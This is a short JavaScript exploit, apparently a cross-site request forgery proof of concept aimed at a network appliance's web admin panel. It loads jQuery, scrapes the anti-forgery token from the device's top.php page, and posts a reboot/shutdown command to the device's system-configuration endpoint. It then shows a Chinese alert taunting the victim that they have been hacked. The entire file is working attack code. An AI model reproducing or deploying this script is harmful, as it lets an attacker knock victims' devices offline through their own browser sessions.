
function loadScript(url){
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function (){
    loadScript("https://libs.baidu.com/jquery/2.0.0/jquery.min.js");
}
let vdata = null;
setTimeout(test, 1000)
function test(){
    $(function(){
        $.get("https://192.168.4.251:9090/top.php", function(data){
            vdata = data;
            var token = $(vdata).find("input[name=tokenid]")[0].value;
            $.post('https://192.168.4.251:9090/view/systemConfig/reboot/shutdown_commit.php',
                {
                    tokenid: token,
                    operation: 'on',
                    rebootmode: '1',
                    servicename: '',
                    cfgsave: 'save'
                },
                function(data, status){
                    console.log('Data: ' + data + '\nStatus: ' + status);
                    alert("你已经被黑了，看看你的设备还好么？")；
                }
            );

    })});
    
}
